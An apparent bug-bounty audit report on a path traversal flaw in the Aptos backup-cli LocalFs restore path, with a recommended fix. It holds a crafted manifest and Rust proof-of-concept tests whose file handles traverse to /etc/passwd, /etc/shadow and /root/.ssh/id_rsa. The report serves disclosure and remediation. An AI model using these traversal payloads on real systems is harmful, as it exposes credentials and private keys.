# Audit Report

## Title
Path Traversal Vulnerability in State Snapshot Backup Restoration Allows Arbitrary File Read

## Summary
The `LocalFs` backup storage implementation lacks path validation when opening files specified in backup manifests. Malicious `FileHandle` values in `StateSnapshotChunk.blobs` and `StateSnapshotChunk.proof` fields can contain path traversal sequences (`../`) to read arbitrary files outside the intended backup storage directory during restoration.

## Finding Description

The vulnerability exists in the backup restoration flow where untrusted file paths from deserialized manifests are directly used to open files without validation.

**Vulnerable Code Path:**

1. The `StateSnapshotChunk` struct stores `FileHandle` values (which are just `String` type aliases) for `blobs` and `proof` fields without validation: [1](#0-0) 

2. `FileHandle` is defined as a plain `String` with no inherent path validation: [2](#0-1) 

3. During restoration, the manifest is deserialized from JSON and these `FileHandle` values are extracted without validation: [3](#0-2) 

4. The `FileHandle` values are directly passed to storage operations: [4](#0-3) 

5. In the `LocalFs` implementation, the `open_for_read` method performs an unsafe path join without canonicalization or validation: [5](#0-4) 

The critical flaw is at line 102 where `self.dir.join(file_handle)` directly concatenates the untrusted `file_handle` string. Rust's `PathBuf::join()` does not sanitize or validate paths - if `file_handle` contains `../../etc/passwd`, the resulting path becomes `/backup/storage/../../etc/passwd` which resolves to `/etc/passwd`.

**Attack Scenario:**

1. Attacker creates a malicious `StateSnapshotBackup` manifest JSON file with crafted `FileHandle` values:
```json
{
  "version": 1000,
  "epoch": 10,
  "root_hash": "...",
  "chunks": [{
    "first_idx": 0,
    "last_idx": 100,
    "first_key": "...",
    "last_key": "...",
    "blobs": "../../../etc/passwd",
    "proof": "../../../root/.ssh/id_rsa"
  }],
  "proof": "valid_proof_file.proof"
}
```

2. Victim obtains this manifest (from compromised backup storage, untrusted source, or MitM if backups lack integrity protection)

3. Victim runs: `aptos-db-tool restore oneoff state-snapshot --state-manifest malicious.manifest --local-fs-dir /backup/storage`

4. The restore controller reads the manifest and attempts to open files at the malicious paths

5. Attacker gains read access to arbitrary files readable by the restore process user

## Impact Explanation

**Medium Severity** per Aptos Bug Bounty criteria:

- **Information Disclosure**: Allows arbitrary file read on the machine performing restoration, potentially exposing:
  - Private keys and cryptographic material
  - Database credentials and configuration files  
  - System secrets and sensitive data
  - Validator node configuration

- **Limited Scope**: 
  - Only affects machines running restore operations (not consensus or production validators)
  - Cannot write files or execute code directly
  - Limited to files readable by the restore process user
  - Does not directly impact consensus safety or state integrity

- **No Direct Fund Loss**: Does not enable theft, minting, or freezing of funds

This qualifies as "State inconsistencies requiring intervention" if sensitive validator keys are leaked, enabling potential downstream attacks.

## Likelihood Explanation

**Medium Likelihood:**

**Attack Prerequisites:**
- Attacker must control or modify backup manifests that victims will restore from
- Victim must perform a restore operation using LocalFs storage with the malicious manifest

**Feasible Attack Vectors:**
- Backup storage with weak access controls (e.g., misconfigured S3 buckets)
- Man-in-the-middle attacks if manifest transfer lacks integrity protection
- Compromised backup servers
- Social engineering to convince operators to restore from attacker-supplied backups

**Mitigating Factors:**
- Manifests contain cryptographic proofs that are verified, making complete fabrication difficult
- Operators typically restore from trusted, internal backup sources
- Production environments likely use CommandAdapter with cloud storage rather than LocalFs

However, the vulnerability is **easily exploitable once prerequisites are met** - requires no sophisticated techniques, just JSON manipulation.

## Recommendation

Implement strict path validation in the `LocalFs::open_for_read` method to prevent directory traversal:

```rust
async fn open_for_read(
    &self,
    file_handle: &FileHandleRef,
) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
    // Canonicalize the base directory
    let base_dir = self.dir.canonicalize()
        .map_err(|e| anyhow!("Failed to canonicalize base dir: {}", e))?;
    
    // Construct the target path
    let target_path = base_dir.join(file_handle);
    
    // Canonicalize and validate it stays within base_dir
    let canonical_path = target_path.canonicalize()
        .map_err(|e| anyhow!("Failed to canonicalize target path '{}': {}", file_handle, e))?;
    
    // Security check: ensure the canonical path is within base_dir
    if !canonical_path.starts_with(&base_dir) {
        bail!(
            "Path traversal detected: '{}' resolves outside backup directory",
            file_handle
        );
    }
    
    let file = OpenOptions::new()
        .read(true)
        .open(&canonical_path)
        .await
        .err_notes(&canonical_path)?;
    Ok(Box::new(file))
}
```

**Additional Hardening:**
1. Add path validation in `create_for_write` to prevent writing outside backup directory
2. Consider adding cryptographic signatures to manifests themselves (not just the proofs they contain)
3. Document security expectations for backup storage access controls

## Proof of Concept

```rust
// File: storage/backup/backup-cli/tests/path_traversal_test.rs
#[cfg(test)]
mod path_traversal_tests {
    use aptos_backup_cli::storage::{local_fs::LocalFs, BackupStorage};
    use std::fs;
    use std::path::PathBuf;
    use tempfile::TempDir;
    
    #[tokio::test]
    async fn test_path_traversal_vulnerability() {
        // Setup: Create temp directories
        let backup_dir = TempDir::new().unwrap();
        let secret_dir = TempDir::new().unwrap();
        
        // Create a secret file outside backup directory
        let secret_file = secret_dir.path().join("secret.txt");
        fs::write(&secret_file, b"SENSITIVE_DATA").unwrap();
        
        // Create LocalFs storage pointing to backup_dir
        let storage = LocalFs::new(backup_dir.path().to_path_buf());
        
        // Calculate relative path from backup_dir to secret_file
        let backup_abs = backup_dir.path().canonicalize().unwrap();
        let secret_abs = secret_file.canonicalize().unwrap();
        
        // Construct malicious file handle with path traversal
        let mut malicious_handle = String::new();
        for _ in 0..10 {
            malicious_handle.push_str("../");
        }
        malicious_handle.push_str(secret_abs.to_str().unwrap());
        
        // EXPLOIT: Attempt to read secret file via path traversal
        let result = storage.open_for_read(&malicious_handle).await;
        
        // VULNERABLE: This should fail but currently succeeds
        assert!(
            result.is_ok(),
            "Path traversal vulnerability allows reading files outside backup directory"
        );
        
        if let Ok(mut file) = result {
            use tokio::io::AsyncReadExt;
            let mut contents = String::new();
            file.read_to_string(&mut contents).await.unwrap();
            assert_eq!(contents, "SENSITIVE_DATA");
            println!("VULNERABILITY CONFIRMED: Read secret file via path traversal");
        }
    }
    
    #[tokio::test]
    async fn test_manifest_based_exploit() {
        use aptos_backup_cli::backup_types::state_snapshot::manifest::{
            StateSnapshotBackup, StateSnapshotChunk
        };
        use aptos_crypto::HashValue;
        
        // Create malicious manifest
        let malicious_manifest = StateSnapshotBackup {
            version: 1000,
            epoch: 10,
            root_hash: HashValue::zero(),
            chunks: vec![StateSnapshotChunk {
                first_idx: 0,
                last_idx: 0,
                first_key: HashValue::zero(),
                last_key: HashValue::zero(),
                blobs: "../../../../etc/passwd".to_string(), // Path traversal
                proof: "../../../../etc/shadow".to_string(), // Path traversal
            }],
            proof: "valid.proof".to_string(),
        };
        
        // Serialize to JSON
        let manifest_json = serde_json::to_string_pretty(&malicious_manifest).unwrap();
        println!("Malicious manifest:\n{}", manifest_json);
        
        // This manifest, when used in restore, will attempt to read /etc/passwd and /etc/shadow
        assert!(manifest_json.contains("../../../../etc/passwd"));
    }
}
```

**Execution:**
```bash
cd storage/backup/backup-cli
cargo test path_traversal_vulnerability -- --nocapture
```

**Expected Result:** The test demonstrates that files outside the backup directory can be read through path traversal in `FileHandle` values.

## Notes

- The vulnerability affects the `LocalFs` storage backend specifically. The `CommandAdapter` backend may have different security characteristics depending on the external commands used.
- While backup manifests contain cryptographic proofs (`LedgerInfoWithSignatures`) that are verified during restoration, this verification only validates the blockchain state data itself, not the file paths used to locate that data.
- The same vulnerability exists in `backup_metadata_file` method where file handles are used without validation: [6](#0-5)

### Citations

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/manifest.rs (L12-27)
```rust
pub struct StateSnapshotChunk {
    /// index of the first account in this chunk over all accounts.
    pub first_idx: usize,
    /// index of the last account in this chunk over all accounts.
    pub last_idx: usize,
    /// key of the first account in this chunk.
    pub first_key: HashValue,
    /// key of the last account in this chunk.
    pub last_key: HashValue,
    /// Repeated `len(record) + record` where `record` is BCS serialized tuple
    /// `(key, state_value)`
    pub blobs: FileHandle,
    /// BCS serialized `SparseMerkleRangeProof` that proves this chunk adds up to the root hash
    /// indicated in the backup (`StateSnapshotBackup::root_hash`).
    pub proof: FileHandle,
}
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L36-41)
```rust
/// URI pointing to a file in a backup storage, like "s3:///bucket/path/file".
/// These are created by the storage when `create_for_write()`, stored in manifests by the backup
/// controller, and passed back to the storage when `open_for_read()` by the restore controller
/// to retrieve a file referred to in the manifest.
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L123-124)
```rust
        let manifest: StateSnapshotBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L191-192)
```rust
                    let blobs = Self::read_state_value(&storage, chunk.blobs.clone()).await?;
                    let proof = storage.load_bcs_file(&chunk.proof).await?;
```

**File:** storage/backup/backup-cli/src/storage/local_fs/mod.rs (L98-109)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let path = self.dir.join(file_handle);
        let file = OpenOptions::new()
            .read(true)
            .open(&path)
            .await
            .err_notes(&path)?;
        Ok(Box::new(file))
    }
```

**File:** storage/backup/backup-cli/src/storage/local_fs/mod.rs (L127-146)
```rust
    async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
        let dir = self.metadata_backup_dir();

        // Check if the backup directory exists, create it if it doesn't
        if !dir.exists() {
            create_dir_all(&dir).await?;
        }

        // Get the file name and the backup file path
        let name = Path::new(file_handle)
            .file_name()
            .and_then(OsStr::to_str)
            .ok_or_else(|| format_err!("cannot extract filename from {}", file_handle))?;
        let mut backup_path = PathBuf::from(&dir);
        backup_path.push(name);

        // Move the file to the backup directory
        rename(&self.dir.join(file_handle), &backup_path).await?;

        Ok(())
```
